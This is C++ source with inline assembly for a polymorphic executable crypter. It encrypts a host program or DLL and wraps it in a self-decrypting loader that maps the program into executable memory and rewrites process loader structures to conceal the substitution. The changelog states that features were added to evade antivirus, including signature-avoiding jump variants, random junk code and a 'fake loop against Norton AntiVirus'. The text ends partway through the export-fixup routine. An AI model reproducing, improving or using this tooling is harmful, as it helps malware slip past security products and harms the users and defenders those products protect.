#include <windows.h>
#include <winnt.h>
#include <imagehlp.h>
#include <time.h>
#include <iostream>
#include <tchar.h>

//if RUBBISH_NOPS defined, inserted rubbish are nops only (good for debugging)
//#define RUBBISH_NOPS
//#define STATIC_CONTEXT

//ORIGINAL
//this is how our new PE loox like:
//
//CodeSection:
//0..0x10: jmp GetProcAddress+jmp LoadLibrary+pad
//0x10..0x10+KeySize:Key
//0x10+KeySize..0x10+KeySize+sizeof(DynLoader):DynLoader
//0x10+KeySize+sizeof(DynLoader): code
//
//DataSection:
//0..sizeof(host)-1: host
//
//ImportSection:
//0..0x70-1: imports
//
//[TlsSection:]
//0..sizeof(tls): tls
//


//Changelog 1.2a
//moved import function jmps (getprocaddress, loadlibrary) to the end of initdata/polymorphic loader to
//prevent AV detection (code section started with ..000000FF2534.. which was a signature):
//implemented several variants of each jmp to import section (getprocaddress, loadlibrary) and added fixups

//this is how our new PE loox like:
//
//CodeSection:
//0x0..KeySize:Key
//KeySize..KeySize+sizeof(DynLoader):DynLoader
//KeySize+sizeof(DynLoader): code
//
//DataSection:
//0..sizeof(host)-1: host
//
//ImportSection:
//0..0x70-1: imports
//
//[TlsSection:]
//0..sizeof(tls): tls


//Changelog 1.2b
//- some random data (CoderRoller1) into encryption routine (DynCoder and Decoder)
//- data section eliminated (too risky to have it)
//- minor bug fixes
//
//this is how our new PE loox like:
//
//CodeSection:
//0: Rubbish
//KeyPtr..KeyPtr+KeySize:Key
//KeyPtr+KeySize..KeyPtr+KeySize+sizeof(DynLoader):DynLoader
//KeyPtr+KeySize+sizeof(DynLoader): code
//code+sizeof(code): host
//
//ImportSection:
//0..0x70-1: imports
//
//[TlsSection:]
//0..sizeof(tls): tls

//Changelog 1.3
//- polycode liposuction
//- polycode instruction naming

//Changelog 1.4
//- DLL SUPPORT!!!
//- well some hacks are here, so nobody can say that the code is correct - see DynLoader
//- minor bugfixes
//+ .edata section after .tls

//Changelog 1.5
//- polycode improved

//Changelog 1.6
//- polycode shrinked
//- dynloader decrypts main data

//Changelog 1.7
//- secondary encryption routine has variable-length key

//Changelog 1.8
//- polycode shrinked

//Changelog 1.9
//- icon + XP manifest support

//Changelog 2.0
//- secondary encryption routine is randomly generated
//- resource support for DLLs
//- fake loop against Norton AntiVirus 

//Changelog 2.1
//- FSG 2.0 exe packer support

//Changelog 2.2
//- support for some other exe packers - Mew 1.1

//Changelog 2.3
//- fixed two serious bugz

//Changelog 2.4
//- better support for VB programs
//- support for end of file overlay data

//Changelog 2.5
//- bugfix in TLS support 

//Changelog 2.6
//- bugfix in TLS support number 2

//Changelog 2.7
//- better DLL handling -> support for NT4 DLLs

//if you need sum PEB, TEB structures (like in DynLoader)
//try look at these links:
//http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Thread/TEB.html
//http://undocumented.ntinternals.net/UserMode/Structures/LDR_MODULE.html
//http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html



//we need a dos stub
//that's the common dos prog writing "This program cannot be run in DOS mode"
const BYTE DosStub[0x38]
 ={0xBA,0x10,0x00,0x0E,0x1F,0xB4,0x09,0xCD,0x21,0xB8,0x01,0x4C,0xCD,0x21,0x90,0x90,
  0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6F,0x67,0x72,0x61,0x6D,0x20,0x6D,0x75,0x73,
  0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6E,0x20,0x75,0x6E,0x64,0x65,0x72,0x20,0x57,
  0x69,0x6E,0x33,0x32,0x0D,0x0A,0x24,0x37};

//import section constants
#define NumberOfDLL                                             1                               //number of dlls
#define NumberOfImports                                 2                               //number of funcs
#define Kernel32Name                                    "kernel32.dll"  //name of dll
#define NtdllName                                               "ntdll.dll"             //name of ntdll.dll

#define GetProcAddressName                              "GetProcAddress"//name of funct1
#define LoadLibraryName                                 "LoadLibraryA"  //name of func2
#define Kernel32Size                                    12                              //length of dll name
#define GetProcAddressSize                              14                              //length of func1 name
#define LoadLibrarySize                                 12                              //length of func2 name

//polymorphic instruction indexes
#define PII_BEGIN                                               0

#define PII_POLY_BEGIN                                  PII_BEGIN
#define PII_POLY_PUSHAD                                 PII_POLY_BEGIN
#define PII_POLY_MOV_REG_LOADER_SIZE    PII_POLY_PUSHAD+1
#define PII_POLY_MOV_REG_LOADER_ADDR    PII_POLY_MOV_REG_LOADER_SIZE+1

#define PII_CODER_BEGIN                                 PII_POLY_MOV_REG_LOADER_ADDR+1
#define PII_CODER_CALL_GET_EIP                  PII_CODER_BEGIN+1
#define PII_CODER_GET_EIP                               PII_CODER_CALL_GET_EIP+1
#define PII_CODER_FIX_DST_PTR                   PII_CODER_GET_EIP+1
#define PII_CODER_KEY_START                             PII_CODER_FIX_DST_PTR+1
#define PII_CODER_MOV_REG_KEY                   PII_CODER_KEY_START
#define PII_CODER_FIX_SRC_PTR                   PII_CODER_MOV_REG_KEY+1

#define PII_CODER_CODE                                  PII_CODER_FIX_SRC_PTR+1
#define PII_CODER_LOAD_KEY_TO_REG               PII_CODER_CODE
#define PII_CODER_TEST_KEY_END                  PII_CODER_LOAD_KEY_TO_REG+1
#define PII_CODER_JZ_CODER_BEGIN                PII_CODER_TEST_KEY_END+1
#define PII_CODER_ADD_DATA_IDX                  PII_CODER_JZ_CODER_BEGIN+1
#define PII_CODER_XOR_DATA_REG                  PII_CODER_ADD_DATA_IDX+1
#define PII_CODER_STORE_DATA                    PII_CODER_XOR_DATA_REG+1
#define PII_CODER_INC_SRC_PTR                   PII_CODER_STORE_DATA+1
#define PII_CODER_LOOP_CODER_CODE               PII_CODER_INC_SRC_PTR+1
#define PII_CODER_END                                   PII_CODER_LOOP_CODER_CODE+1

#define PII_POLY_JMP_DYNLOADER                  PII_CODER_END+1
#define PII_POLY_END                                    PII_POLY_JMP_DYNLOADER
#define PII_END                                                 PII_POLY_END

//other consts
#define MaxPolyCount                                    20                      //maximum variants for one instruction
#define InitInstrCount                                  PII_END+1       //polymorphic loader instruction count
#define RawDataAlignment                                0x200           //alignment of SizeOfRawData
#define DosStubEndSize                                  0x88            //0x100 - SizeOf(DosStub)

//image type const
#define IMAGE_TYPE_EXE                                  0
#define IMAGE_TYPE_DLL                                  1
#define IMAGE_TYPE_SYS                                  2
#define IMAGE_TYPE_UNKNOWN                              0xFFFFFFFF

//this dword is at the end of DYN_LOADER in decoded form
#define DYN_LOADER_END_MAGIC                    0xC0DEC0DE
#define DYN_LOADER_DEC_MAGIC                    0x1EE7C0DE

//registers
#define REG_EAX                                                 0
#define REG_ECX                                                 1
#define REG_EDX                                                 2
#define REG_EBX                                                 3
#define REG_ESP                                                 4
#define REG_EBP                                                 5
#define REG_ESI                                                 6
#define REG_EDI                                                 7
#define REG_NON                                                 255

#define Reg8Count                                               8
#define Reg16Count                                              8
#define Reg32Count                                              8

#define RT_XP_MANIFEST                                  24

//our type for all about tls section
typedef struct _IMAGE_TLS_DIRECTORY__ {
    DWORD   StartAddressOfRawData;
    DWORD   EndAddressOfRawData;
    DWORD   AddressOfIndex;             // PDWORD
    DWORD   AddressOfCallBacks;         // PIMAGE_TLS_CALLBACK *
    DWORD   SizeOfZeroFill;
    DWORD   Characteristics;
} IMAGE_TLS_DIRECTORY__, *PIMAGE_TLS_DIRECTORY__;

//our type for all about tls section
typedef struct _TLS_COPY
{
        PIMAGE_DATA_DIRECTORY           Directory;
        PIMAGE_TLS_DIRECTORY__          SectionData;
        DWORD                                           RawData;
        DWORD                                           RawDataLen,Index;
        PCHAR                                           Callbacks;
        DWORD                                           CallbacksLen;
}TLS_COPY;

//one pseudo-instruction (p-i) from polymorphic engine (can contain more than one x86 instruction)
typedef struct _INSTRUCTION
{
        BYTE Len;                                               //opcode length
        BYTE Fix1,Fix2,Fix3,Fix4;               //bytes indexes for fixup
        CHAR Code[31];                                  //opcode
}INSTRUCTION;

//a list of p-i, we will chose one each time and put it into a code
typedef struct
{
        BYTE                    Count,Index;            //number of p-i and number of the chosen
        DWORD                   VirtualAddress;         //address of instruction in CODE section
        INSTRUCTION             Vars[MaxPolyCount];     //the list
}VAR_INSTRUCTION;

typedef struct _RESOURCE_TABLE_DIRECTORY_ENTRY{
        IMAGE_RESOURCE_DIRECTORY                        Table;
        IMAGE_RESOURCE_DIRECTORY_ENTRY  Directory;
}RESOURCE_TABLE_DIRECTORY_ENTRY, *PRESOURCE_TABLE_DIRECTORY_ENTRY;

typedef struct _ICON_DIRECTORY_ENTRY{
        BYTE            Width;
        BYTE            Height;
        BYTE            ColorCount;
        BYTE            Reserved;
        WORD            Planes;
        WORD            BitCount;
        WORD            BytesInRes1;
        WORD            BytesInRes2;
        WORD            ID;
}ICON_DIRECTORY_ENTRY, *PICON_DIRECTORY_ENTRY;

typedef struct _ICON_DIRECTORY{
        WORD                                    Reserved;
        WORD                                    ResType;
        WORD                                    Count;
        ICON_DIRECTORY_ENTRY    Entries[32];
}ICON_DIRECTORY, *PICON_DIRECTORY;

enum IMAGE_TYPE { itExe,itDLL,itSys};


typedef DWORD (__stdcall *TEncoderProc)(void * AAddr);


PIMAGE_DOS_HEADER                       pimage_dos_header;
PIMAGE_NT_HEADERS                       pimage_nt_headers;
PIMAGE_EXPORT_DIRECTORY         pimage_export_directory;
IMAGE_DOS_HEADER                        DosHeader;
CHAR                                            DosStubEnd[DosStubEndSize];
IMAGE_NT_HEADERS                        NtHeaders;
HANDLE                                          FileHandle,MainFile;
char                                            InputFileName[255];
char                                            OutputFileName[255];
char                                            Options[64];
DWORD                                           NumBytes,TotalFileSize,MainSize,LoaderSize;
DWORD                                           VirtLoaderData,VirtMainData,VirtKey,InitSize,KeyPtr;
DWORD                                           AnyDWORD,LoaderPtr,TlsSectionSize,Delta,HostImageBase;
DWORD                                           HostSizeOfImage,HostCharacteristics;
DWORD                                           ReqImageBase,RandomValue,ExportSectionSize;
DWORD                                           CurVirtAddr,CurRawData,ExportRVADelta;
DWORD                                           HostExportSectionVirtualAddress;
DWORD                                           ExportNamePointerRVAOrg,ExportAddressRVAOrg;
DWORD                                           ImportSectionDataSize,HostImportSectionSize,ImportSectionDLLCount;
DWORD                                           HostImportSectionVirtualAddress,InitcodeThunk;
DWORD                                           CodeSectionVirtualSize,LoaderRealSize;
DWORD                                           MainRealSize,MainRealSize4,LogCnt,MainDataDecoderLen;
DWORD                                           DynLoaderDecoderOffset,LdrPtrCode,LdrPtrThunk;
DWORD                                           ResourceSectionSize,HostResourceSectionSize;
//DWORD                                         ResourceIconGroupDataSize
DWORD                                           HostResourceSectionVirtualAddress;
//DWORD                                         ResourceXPMDirSize;
DWORD                                           AfterImageOverlaysSize;
IMAGE_SECTION_HEADER            CodeSection;
IMAGE_SECTION_HEADER            ExportSection;
IMAGE_SECTION_HEADER            TlsSection;
IMAGE_SECTION_HEADER            ImportSection;
IMAGE_SECTION_HEADER            ResourceSection;

IMAGE_IMPORT_DESCRIPTOR         ImportDesc;
IMAGE_IMPORT_DESCRIPTOR         NullDesc;
PIMAGE_IMPORT_DESCRIPTOR        PImportDesc;

IMAGE_THUNK_DATA                        ThunkGetProcAddress;
IMAGE_THUNK_DATA                        ThunkLoadLibrary;

//WORD                                          NullWord;
WORD                                            KeySize,TrashSize,Trash2Size,HostSubsystem;

PCHAR                                           MainData,MainDataCyp,LoaderData,Key,InitData,Trash,Trash2;
PCHAR                                           ExportData,ImportSectionData,ResourceData;
PCHAR                                           MainDataEncoder,MainDataDecoder,AfterImageOverlays;

char                                            *PB,*PB2,*PB3,*PB4,*DynLoaderSub,*LdrPtr,*MainDataDecPtr;
BOOL                                            TlsSectionPresent,ExportSectionPresent,Quiet,DynamicDLL;
BOOL                                            ResourceSectionPresent,SaveIcon,SaveOverlay,OverlayPresent;
TLS_COPY                                        TlsCopy;
IMAGE_TLS_DIRECTORY__           TlsSectionData;
IMAGE_TYPE                                      ImageType;
//DWORD *                                       DynLoaderJmp;
PIMAGE_RESOURCE_DIRECTORY       ResourceRoot;
PIMAGE_RESOURCE_DIRECTORY       ResourceIconGroup;
PIMAGE_RESOURCE_DIRECTORY       ResourceXPManifest;
PIMAGE_RESOURCE_DIRECTORY_ENTRY ResourceDirEntry;
TEncoderProc                            EncoderProc;

//---------------------------------------------------------
// byte ptr             (1 bytes)
#define BYTE_TYPE(x)                    __asm _emit x 
// word ptr             (2 bytes)
#define WORD_TYPE(x)                    BYTE_TYPE((x>>(0*8))&0xFF)      BYTE_TYPE((x>>(1*8))&0xFF)
// dword ptr    (4 bytes)
#define DWORD_TYPE(x)                   BYTE_TYPE((x>>(0*8))&0xFF)      BYTE_TYPE((x>>(1*8))&0xFF)      BYTE_TYPE((x>>(2*8))&0xFF)      BYTE_TYPE((x>>(3*8))&0xFF)
// dword64 ptr  (8 bytes)
#define DWORD64_TYPE(x)                 DWORD_TYPE(x)   DWORD_TYPE(x)

//---------------------------------------------------------
#define BB(x)                                   __asm _emit x 
#define DB                                              BYTE_TYPE(0xCC)
#define DD                                              DWORD_TYPE(0xCC)

__stdcall void DynLoader()
{
_asm
{
        //THE LOADER!
        //this loads pe file to memory from MainData
        //fixup relocations
        //fixup imports
        //fixup exports
        //doesn't protect pages - cuz we don't need this !?
        //
        push 012345678h               //LoadLibrary
        push 012345678h               //GetProcAddress
        push 012345678h               //Addr of MainData
        //now lil hack
        //we use rva for maindata, but we don't know image base
        //we get eip and and it with 0FFFFF000h which does
        //from 000401XXXh something like 000401000h that's why we
        //have to be sure this code is not after 2000h, but WE DO know it
        call _get_eip
_get_eip:
        pop eax
        and eax,0FFFFF000h
        add [esp],eax
        add [esp+004h],eax
        add [esp+008h],eax
        
        call _DynLoader_begin
        
        //one more hack here
        //code in LoadLibrary that call DllMain saves its esp into esi
        //but we modify esi a lot and we shouldn't do this, also ebp for NT4 is need to safe
        //but we can fix this up, cuz we know we left esp and it has right value
        //so add sum 010h for DllMain params + ret addr and here we go
        //  mov esi,esp
        //popad without eax and ecx
        pop edi
        pop esi
        pop ebp
        add esp,004h
        pop ebx
        pop edx
        add esp,008h
        
        mov [esp+004h],ecx            //change DllMain.hinstDLL
        //  int 3
        jmp eax                       //jump to entrypoint
        
_DynLoader_begin:
        //we've got image base in eax (except ax), save it to ebp-050h
        push ebp
        mov ebp,esp
        sub esp,00000200h
        /*
        -01F8..-0100 -       IMAGE_NT_HEADERS   NtHeaders
        -09C         -       MemoryBasicInformation.BaseAddress
        -098         -       MemoryBasicInformation.AllocationBase
        -094         -       MemoryBasicInformation.AllocationProtect
        -090         -       MemoryBasicInformation.RegionSize
        -08C         -       MemoryBasicInformation.State
        -088         -       MemoryBasicInformation.Protect
        -084         -       MemoryBasicInformation.Type
        
        -07C         -       PVOID IsBadReadPtr()
        -078         -       PVOID VirtualQuery()
        -074         -       PVOID VirtualProtect()
        -070         -       DWORD FirstModule
        
        -054         -       DWORD OrgImageSize
        -050         -       DWORD ImageBase
        -04C         -       DWORD ImageEntryPoint
        -048         -       DWORD ImageSize
        -044         -       DWORD ImageType
        -040         -       DWORD HintName
        -03C         -       DWORD Thunk
        -038..-010   -       IMAGE_SECTION_HEADER Section
        -00C         -       PCHAR FileData
        -008         -       DWORD ImageSizeOrg:Cardinal
        -004         -       DWORD ImageBaseOrg:Cardinal
        +008         -       PCHAR AddrOfMainData:Pointer
        +00C         -       PVOID GetProcAddress()
        +010         -       PVOID LoadLibrary()
        */
        push ebx                                                        //save ebx, edi, esi
        push edi
        push esi
        
        and eax,0FFFF0000h
        
        mov [ebp-050h],eax                                      //save ImageBase
        
        mov ecx,00008000h
_DynLoader_fake_loop:
        add eax,0AF631837h
        xor ebx,eax
        add bx,ax
        rol ebx,007h
        loop _DynLoader_fake_loop
        //HERE you can insert our own crypto routine
        //esp and ebp should not be changed
        push dword ptr [ebp+008h]                       //AAddr
DWORD_TYPE(DYN_LOADER_DEC_MAGIC)
        //\end of crypto routine
        
        call _DynLoader_fill_image_info
        
        push 000h
        push 06C6C642Eh
        push 032336C65h
        push 06E72656Bh                                         //kernel32.dll on stack
        push esp                                                        //lpLibFileName
        mov eax,[ebp+010h]                                      //ImportThunk.LoadLibrary
        call [eax]                                                      //LoadLibrary
        add esp,010h
        mov edi,eax
        
        push 000h
        push 0636F6C6Ch
        push 0416C6175h
        push 074726956h                                         //VirtualAlloc on stack
        push esp                                                        //lpProcName
        push eax                                                        //hModule
        mov eax,[ebp+00Ch]                                      //ImportThunk.GetProcAddress
        call [eax]                                                      //GetProcAddress
        add esp,010h
        mov ebx,eax
        test eax,eax
        jz _DynLoader_end
        
        push 000007463h
        push 065746f72h
        push 0506C6175h
        push 074726956h                                         //VirtualProtect on stack
        push esp                                                        //lpProcName
        push edi                                                        //hModule
        mov eax,[ebp+00Ch]                                      //ImportThunk.GetProcAddress
        call [eax]                                                      //GetProcAddress
        add esp,010h
        mov [ebp-074h],eax                                      //VirtualProtect
        test eax,eax
        jz _DynLoader_end
        
        push 000h
        push 079726575h
        push 0516C6175h
        push 074726956h                                         //VirtualQuery on stack
        push esp                                                        //lpProcName
        push edi                                                        //hModule
        mov eax,[ebp+00Ch]                                      //ImportThunk.GetProcAddress
        call [eax]                                                      //GetProcAddress
        add esp,010h
        mov [ebp-078h],eax                                      //VirtualQuery
        test eax,eax
        jz _DynLoader_end
        
        push 000h
        push 072745064h
        push 061655264h
        push 061427349h                                         //IsBadReadPtr on stack
        push esp                                                        //lpProcName
        push edi                                                        //hModule
        mov eax,[ebp+00Ch]                                      //ImportThunk.GetProcAddress
        call [eax]                                                      //GetProcAddress
        add esp,010h
        mov [ebp-07Ch],eax                                      //IsBadReadPtr
        test eax,eax
        jz _DynLoader_end


        lea edi,[ebp-01F8h]                                     //NtHeaders
        push edi
        mov esi,[ebp+008h]                                      //IMAGE_DOS_HEADER
        add esi,[esi+03Ch]                                      //IMAGE_DOS_HEADER.e_lfanew
        push 03Eh                                                       //WORD(sizeof(NtHeaders) / 4)
        pop ecx
        rep movsd
        pop edi
        mov eax,[edi+034h]                                      //NtHeaders.OptionalHeader.ImageBase
        mov [ebp-004h],eax                                      //ImageBaseOrg
        mov ecx,[edi+050h]                                      //NtHeaders.OptionalHeader.SizeOfImage
        mov [ebp-008h],ecx                                      //ImageSizeOrg

        push ecx
        push PAGE_EXECUTE_READWRITE                     //flProtect
        push MEM_COMMIT or MEM_RESERVE          //flAllocationType
        push ecx                                                        //dwSize
        push eax                                                        //lpAddress
        call ebx                                                        //VirtualAlloc
        pop ecx
        test eax,eax
        jnz _DynLoader_alloc_done

        push PAGE_EXECUTE_READWRITE                     //flProtect
        push MEM_COMMIT                                         //flAllocationType
        push ecx                                                        //dwSize
        push eax                                                        //lpAddress
        call ebx                                                        //VirtualAlloc
        test eax,eax
        jz _DynLoader_end

_DynLoader_alloc_done:
        mov [ebp-00Ch],eax                                      //FileData
        mov edi,eax
        mov esi,[ebp+008h]                                      //IMAGE_DOS_HEADER
        push esi
        mov ecx,esi                                                     //IMAGE_DOS_HEADER
        add ecx,[esi+03Ch]                                      //+IMAGE_DOS_HEADER.e_lfanew = NtHeaders
        mov ecx,[ecx+054h]                                      //NtHeaders.SizeOfHeaders
        rep movsb
        pop esi
        add esi,[esi+03Ch]                                      //IMAGE_NT_HEADERS
        add esi,0F8h                                            //+sizeof(IMAGE_NT_HEADERS) = section headers
        
_DynLoader_LoadSections:
        mov eax,[ebp+008h]                                      //IMAGE_DOS_HEADER
        add eax,[eax+03Ch]                                      //IMAGE_DOS_HEADER.e_lfanew
        movzx eax,[eax+006h]                            //NtHeaders.FileHeader.NumberOfSections
        
_DynLoader_LoadSections_do_section:
        lea edi,[ebp-038h]                                      //Section
        push edi
        push 00Ah                                                       //WORD(sizeof(TImageSectionHeader) / 4)
        pop ecx
        rep movsd
        pop edi
        
_DynLoader_LoadSections_copy_data:
        mov edx,[edi+014h]                                      //Section.PointerToRawData
        test edx,edx
        jz _DynLoader_LoadSections_next_section
        push esi
        mov esi,[ebp+008h]                                      //AHostAddr
        add esi,edx                                                     //AHostAddr + Section.PointerToRawData
        mov ecx,[edi+010h]                                      //Section.SizeOfRawData
        mov edx,[edi+00Ch]                                      //Section.VirtualAddress
        mov edi,[ebp-00Ch]                                      //FileData
        add edi,edx                                                     //FileData + Section.VirtualAddress
        rep movsb
        pop esi
_DynLoader_LoadSections_next_section:
        dec eax
        jnz _DynLoader_LoadSections_do_section
        
        mov edx,[ebp-00Ch]                                      //FileData
        sub edx,[ebp-004h]                                      //Delta = FileData - ImageBaseOrg
        je _DynLoader_PEBTEBFixup
        
_DynLoader_RelocFixup:
        mov eax,[ebp-00Ch]                                      //FileData
        mov ebx,eax
        add ebx,[ebx+03Ch]                                      //IMAGE_DOS_HEADER.e_lfanew
        mov ebx,[ebx+0A0h]                                      //IMAGE_DIRECTORY_ENTRY_BASERELOC.VirtualAddress
        test ebx,ebx
        jz _DynLoader_PEBTEBFixup
        add ebx,eax
_DynLoader_RelocFixup_block:
        mov eax,[ebx+004h]                                      //ImageBaseRelocation.SizeOfBlock
        test eax,eax
        jz _DynLoader_PEBTEBFixup
        lea ecx,[eax-008h]                                      //ImageBaseRelocation.SizeOfBlock - sizeof(TImageBaseRelocation)
        shr ecx,001h                                            //WORD((ImageBaseRelocation.SizeOfBlock - sizeof(TImageBaseRelocation)) / sizeof(Word))
        lea edi,[ebx+008h]                                      //PImageBaseRelocation + sizeof(TImageBaseRelocation)
_DynLoader_RelocFixup_do_entry:
        movzx eax,word ptr [edi]                        //Entry
        push edx
        mov edx,eax
        shr eax,00Ch                                            //Type = Entry >> 12

        mov esi,[ebp-00Ch]                                      //FileData
        and dx,00FFFh
        add esi,[ebx]                                           //FileData + ImageBaseRelocation.VirtualAddress
        add esi,edx                                                     //FileData + ImageBaseRelocation.VirtualAddress+Entry & 0x0FFF
        pop edx
        
_DynLoader_RelocFixup_HIGH:
        dec eax
        jnz _DynLoader_RelocFixup_LOW
        mov eax,edx
        shr eax,010h                                            //HIWORD(Delta)
        jmp _DynLoader_RelocFixup_LOW_fixup
_DynLoader_RelocFixup_LOW:
        dec eax
        jnz _DynLoader_RelocFixup_HIGHLOW
        movzx eax,dx                                            //LOWORD(Delta)
_DynLoader_RelocFixup_LOW_fixup:
        add word ptr [esi],ax
        jmp _DynLoader_RelocFixup_next_entry
_DynLoader_RelocFixup_HIGHLOW:
        dec eax
        jnz _DynLoader_RelocFixup_next_entry
        add [esi],edx
        
_DynLoader_RelocFixup_next_entry:
        inc edi
        inc edi                                                         //Entry++
        loop _DynLoader_RelocFixup_do_entry
        
_DynLoader_RelocFixup_next_base:
        add ebx,[ebx+004h]                                      //ImageBaseRelocation + ImageBaseRelocation.SizeOfBlock
        jmp _DynLoader_RelocFixup_block
        
_DynLoader_PEBTEBFixup:
        //we have some bad pointers in InLoadOrderModuleList, we have to change the base of our module
        //and if we are executable (not dll) we have to change base address in PEB too
        //for VB programs we need to do it now, because its libraries is reading this stuff
        //in ImportFixup section
        //  int 3
        mov ecx,[ebp-00Ch]                                      //FileData
        mov edx,[ebp-050h]                                      //ImageBase
        add [ebp-04Ch],edx                                      //ImageEntryPoint
        
        mov eax,fs:[000000030h]                         //TEB.PPEB
        cmp dword ptr [ebp-044h],IMAGE_TYPE_EXE //check image type = IMAGE_TYPE_EXE
        jnz _DynLoader_in_module_list
        mov [eax+008h],ecx                                      //PEB.ImageBaseAddr => rewrite old imagebase
_DynLoader_in_module_list:
        mov eax,[eax+00Ch]                                      //PEB.LoaderData
        mov eax,[eax+00Ch]                                      //LoaderData.InLoadOrderModuleList
        
        //now find our module in the list (same base, same size and same entry point)
        mov esi,eax                                                     //first record
        
_DynLoader_in_module_list_one:
        mov edx,[eax+018h]                                      //InLoadOrderModuleList.BaseAddress
        cmp edx,[ebp-050h]                                      //ImageBase
        jnz _DynLoader_in_module_list_next
        mov edx,[eax+01Ch]                                      //InLoaderOrderModuleList.EntryPoint
        cmp edx,[ebp-04Ch]                                      //ImageEntryPoint
        jnz _DynLoader_in_module_list_next
        mov edx,[eax+020h]                                      //InLoaderOrderModuleList.SizeOfImage
        cmp edx,[ebp-048h]                                      //ImageSize
        jnz _DynLoader_in_module_list_next
        mov [eax+018h],ecx                                      //InLoadOrderModuleList.BaseAddress => rewrite old imagebase
        add ecx,[ebp-01D0h]                                     //+NtHeaders.OptionalHeader.AddressOfEntryPoint
        mov [eax+01Ch],ecx                                      //InLoadOrderModuleList.EntryPoint => rewrite old entrypoint
        mov ecx,[ebp-01A8h]                                     //NtHeaders.OptionalHeader.SizeOfImage
        mov [eax+020h],ecx                                      //InLoaderOrderModuleList.SizeOfImage => rewrite old sizeofimage
        jmp _DynLoader_ImportFixup
        
_DynLoader_in_module_list_next:
        cmp [eax],esi                                           //.IF(InLoadOrderModuleList.Flink == first record)
        jz _DynLoader_ImportFixup
        mov eax,[eax]                                           //record = InLoadOrderModuleList.Flink
        jmp _DynLoader_in_module_list_one
        
        
_DynLoader_ImportFixup:
        mov ebx,[ebp-0178h]                                     //NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
        test ebx,ebx
        jz _DynLoader_export_fixup
        mov esi,[ebp-00Ch]                                      //FileData
        add ebx,esi                                                     //FileData + NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
_DynLoader_ImportFixup_module:
        mov eax,[ebx+00Ch]                                      //TImageImportDescriptor.Name
        test eax,eax
        jz _DynLoader_export_fixup
        
        mov ecx,[ebx+010h]                                      //TImageImportDescriptor.FirstThunk
        add ecx,esi
        mov [ebp-03Ch],ecx                                      //Thunk
        mov ecx,[ebx]                                           //TImageImportDescriptor.Characteristics
        test ecx,ecx
        jnz _DynLoader_ImportFixup_table
        mov ecx,[ebx+010h]
_DynLoader_ImportFixup_table:
        add ecx,esi
        mov [ebp-040h],ecx                                      //HintName
        add eax,esi                                                     //TImageImportDescriptor.Name + FileData = ModuleName
        push eax                                                        //lpLibFileName
        mov eax,[ebp+010h]                                      //ImportThunk.LoadLibrary
        call [eax]                                                      //LoadLibrary
        test eax,eax
        jz _DynLoader_end
        mov edi,eax
_DynLoader_ImportFixup_loop:
        mov ecx,[ebp-040h]                                      //HintName
        mov edx,[ecx]                                           //TImageThunkData.Ordinal
        test edx,edx
        jz _DynLoader_ImportFixup_next_module
        test edx,080000000h                                     //.IF( import by ordinal )
        jz _DynLoader_ImportFixup_by_name
        and edx,07FFFFFFFh                                      //get ordinal
        jmp _DynLoader_ImportFixup_get_addr
_DynLoader_ImportFixup_by_name:
        add edx,esi                                                     //TImageThunkData.Ordinal + FileData = OrdinalName
        inc edx
        inc edx                                                         //OrdinalName.Name
_DynLoader_ImportFixup_get_addr:
        push edx                                                        //lpProcName
        push edi                                                        //hModule
        mov eax,[ebp+00Ch]                                      //ImportThunk.GetProcAddress
        call [eax]                                                      //GetProcAddress
        mov ecx,[ebp-03Ch]                                      //HintName
        mov [ecx],eax
        add dword ptr [ebp-03Ch],004h           //Thunk => next Thunk
        add dword ptr [ebp-040h],004h           //HintName => next HintName
        jmp _DynLoader_ImportFixup_loop
_DynLoader_ImportFixup_next_module:
        add ebx,014h                                            //sizeof(TImageImportDescriptor)
        jmp _DynLoader_ImportFixup_module
        
_DynLoader_export_fixup:
        //go through all loaded modules and search for IAT section for our module
        //then change image base in all imports there
        //  int 3
        mov eax,fs:[000000030h]                         //TEB.PPEB
        mov eax,[eax+00Ch]                                      //PEB.LoaderData
        mov ebx,[eax+00Ch]                                      //LoaderData.InLoadOrderModuleList
        mov [ebp-070h],ebx                                      //FirstModule
        
_DynLoader_export_fixup_process_module:
        mov edx,[ebx+018h]                                      //InLoadOrderModuleList.BaseAddress
        cmp edx,[ebp-050h]                                      //ImageBase
        jz _DynLoader_export_fixup_next
        
        push edx
        push 004h                                                       //ucb
        push edx                                                        //lp
        call [ebp-07Ch]                                         //IsBadReadPtr
        pop edx
        test eax,eax
        jnz _DynLoader_export_fixup_next
        
        mov edi,edx
        add edi,[edi+03Ch]                                      //IMAGE_DOS_HEADER.e_lfanew
        mov edi,[edi+080h]                                      //NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
        test edi,edi
        jz _DynLoader_export_fixup_next
        add edi,edx                                                     //+ module.ImageBase
_DynLoader_export_fixup_check_idt:
        xor eax,eax
        push edi
        push 005h                                                       //sizeof(ImportDirectoryTable)/4
        pop ecx
        rep scasd                                                       //test for null Directory Entry
        pop edi
        jz _DynLoader_export_fixup_next
        
        mov esi,[edi+010h]                                      //ImportSection.ImportAddressTableRVA
        add esi,[ebx+018h]                                      //+ module.ImageBase
        mov eax,[esi]                                           //first IAT func address
        sub eax,[ebp-050h]                                      //- ImageBase
        jb _DynLoader_export_fixup_next_idir//this is not our import
        cmp eax,[ebp-048h]                                      //ImageSize
        jbe _DynLoader_export_fixup_prefixaddr //this is our import
        
_DynLoader_export_fixup_next_idir:
        add edi,014h                                            //+ sizeof(IDT) = next IDT
        jmp _DynLoader_export_fixup_check_idt
        
_DynLoader_export_fixup_prefixaddr:
        push 01Ch                                                       //dwLength = sizeof(MemoryBasicInformation)
        lea eax,[ebp-09Ch]                                      //MemoryBasicInformation
        push eax                                                        //lpBuffer
        push esi                                                        //lpAddress
        call [ebp-078h]                                         //VirtualQuery
        
        lea eax,[ebp-088h]                                      //MemoryBasicInformation.Protect
        push eax                                                        //lpflOldProtect
        push PAGE_READWRITE                                     //flNewProtect
        push dword ptr [ebp-090h]                       //dwSize = MemoryBasicInformation.RegionSize
        push dword ptr [ebp-09Ch]                       //lpAddress = MemoryBasicInformation.BaseAddress
        call [ebp-074h]                                         //VirtualProtect
        test eax,eax
